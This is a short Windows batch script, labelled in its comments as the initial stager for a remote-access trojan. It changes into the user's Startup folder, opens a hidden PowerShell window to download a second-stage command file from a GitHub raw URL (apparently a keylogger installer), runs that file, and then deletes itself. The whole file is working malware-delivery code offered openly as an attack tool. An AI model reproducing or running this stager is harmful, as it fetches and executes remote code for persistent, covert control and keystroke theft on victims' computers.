@echo off
@REM initial stager for RAT
@REM created by : jfrdgh (@bigmanlc on dc)

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cd %STARTUP%

@REM TODO: build out stage two

@REM write payloads to startup
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention/main/GetAdmnInstKL.cmd -OutFile GetAdmnInstKL.cmd"


@REM run payload
powershell ./GetAdmnInstKL.cmd

@REM cd back into initial path 
cd "%INITIALPATH%"
del initial.cmd